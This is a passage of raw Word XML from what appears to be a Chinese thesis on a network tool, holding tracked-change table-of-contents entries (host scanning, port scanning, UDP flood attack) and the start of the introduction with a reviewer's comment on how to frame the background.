          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>44</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="783992CB" w14:textId="63D55C48" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="869" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="870" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="871" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>6.3</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="872" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>程序测试</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>44</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="53C15DF8" w14:textId="0163F936" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="873" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="874" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="875" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>6.3.1</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="876" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>选择网卡</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>44</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3C3EE669" w14:textId="59E11A8C" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="877" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="878" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="879" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>6.3.2</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="880" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>主机扫描</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>45</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="541A1286" w14:textId="22DD8AA1" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="881" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="882" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="883" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>6.3.3</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="884" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>MAC</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="885" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>地址获取</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>47</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="07458A5B" w14:textId="0475F2D7" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="886" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="887" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="888" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>6.3.4</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="889" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>端口扫描</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>47</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="11D97936" w14:textId="1FF205B4" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="890" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="891" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="892" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>6.3.5</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="893" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>UDP Flood</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="894" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>攻击</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>48</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5F0BD047" w14:textId="7DEF63F0" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="895" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="896" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="897" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>6.4</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="898" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>本章小结</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>49</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="63420E74" w14:textId="641B9AF6" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:del w:id="899" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="900" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="901" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>结论</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>50</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="78317019" w14:textId="3536DB3F" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:del w:id="902" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="903" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="904" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>参考文献</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>51</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1BA667DE" w14:textId="52E53923" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:del w:id="905" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="906" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="907" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>致谢</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>52</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6A001DF0" w14:textId="719D7870" w:rsidR="00150B71" w:rsidRPr="00E90326" w:rsidDel="00C40D86" w:rsidRDefault="00150B71" w:rsidP="00150B71">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120"/>
        <w:rPr>
          <w:del w:id="908" w:author="李勇" w:date="2017-05-13T21:51:00Z"/>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="黑体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="黑体"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="78786541" w14:textId="77777777" w:rsidR="00150B71" w:rsidRPr="00E90326" w:rsidDel="00C40D86" w:rsidRDefault="00150B71" w:rsidP="00150B71">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120"/>
        <w:rPr>
          <w:del w:id="909" w:author="李勇" w:date="2017-05-13T21:51:00Z"/>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0"/>
          <w:footerReference w:type="even" r:id="rId21"/>
          <w:footerReference w:type="default" r:id="rId22"/>
          <w:headerReference w:type="first" r:id="rId23"/>
          <w:footerReference w:type="first" r:id="rId24"/>
          <w:pgSz w:w="11906" w:h="16838"/>
          <w:pgMar w:top="1440" w:right="1797" w:bottom="1440" w:left="1797" w:header="1134" w:footer="992" w:gutter="0"/>
          <w:pgNumType w:fmt="upperRoman" w:start="1"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="326"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="269AD96A" w14:textId="36FFB2F8" w:rsidR="00150B71" w:rsidRPr="00062408" w:rsidRDefault="00150B71" w:rsidP="008A0A85">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:rPrChange w:id="910" w:author="李勇" w:date="2017-05-14T10:34:00Z">
            <w:rPr>
              <w:sz w:val="36"/>
              <w:szCs w:val="36"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="911" w:name="_Hlt273261550"/>
      <w:bookmarkStart w:id="912" w:name="_Hlt273463979"/>
      <w:bookmarkStart w:id="913" w:name="_Toc482141219"/>
      <w:bookmarkStart w:id="914" w:name="_Toc482141892"/>
      <w:bookmarkStart w:id="915" w:name="_Toc482522602"/>
      <w:bookmarkEnd w:id="911"/>
      <w:bookmarkEnd w:id="912"/>
      <w:r w:rsidRPr="00062408">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:rPrChange w:id="916" w:author="李勇" w:date="2017-05-14T10:34:00Z">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
              <w:sz w:val="36"/>
              <w:szCs w:val="36"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>绪论</w:t>
      </w:r>
      <w:bookmarkEnd w:id="913"/>
      <w:bookmarkEnd w:id="914"/>
      <w:bookmarkEnd w:id="915"/>
    </w:p>
    <w:p w14:paraId="77C2AD9F" w14:textId="50516AE4" w:rsidR="00D82688" w:rsidRPr="00E90326" w:rsidRDefault="0044745E" w:rsidP="00D82688">
      <w:pPr>
        <w:pStyle w:val="20505"/>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="917" w:name="_Toc482141220"/>
      <w:bookmarkStart w:id="918" w:name="_Toc482141893"/>
      <w:bookmarkStart w:id="919" w:name="_Toc482522603"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>课题背景</w:t>
      </w:r>
      <w:bookmarkEnd w:id="917"/>
      <w:bookmarkEnd w:id="918"/>
      <w:ins w:id="920" w:author="renxt" w:date="2017-05-13T20:41:00Z">
        <w:r w:rsidR="009B6601">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
            <w:color w:val="000000"/>
          </w:rPr>
          <w:t xml:space="preserve">（DDos不能引出UDP </w:t>
        </w:r>
        <w:r w:rsidR="009B6601" w:rsidRPr="00902006">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
            <w:color w:val="000000"/>
          </w:rPr>
          <w:t>F</w:t>
        </w:r>
        <w:r w:rsidR="009B6601" w:rsidRPr="00902006">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
            <w:color w:val="000000"/>
          </w:rPr>
          <w:t>lood攻击</w:t>
        </w:r>
        <w:r w:rsidR="009B6601">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
            <w:color w:val="000000"/>
          </w:rPr>
          <w:t>吧。</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="921" w:author="renxt" w:date="2017-05-13T20:42:00Z">
        <w:r w:rsidR="000D3979">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
            <w:color w:val="000000"/>
          </w:rPr>
          <w:t>应从攻击开始写，别从DDos开始</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="922" w:author="renxt" w:date="2017-05-13T20:41:00Z">
        <w:r w:rsidR="009B6601">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
            <w:color w:val="000000"/>
          </w:rPr>
          <w:t>）</w:t>
        </w:r>
      </w:ins>
      <w:bookmarkEnd w:id="919"/>
    </w:p>
    <w:p w14:paraId="5774217B" w14:textId="6247A1F4" w:rsidR="00554707" w:rsidRDefault="00D82688" w:rsidP="00554707">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:ins w:id="923" w:author="yong li" w:date="2017-05-14T19:37:00Z"/>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:pPrChange w:id="924" w:author="yong li" w:date="2017-05-14T19:37:00Z">
          <w:pPr>
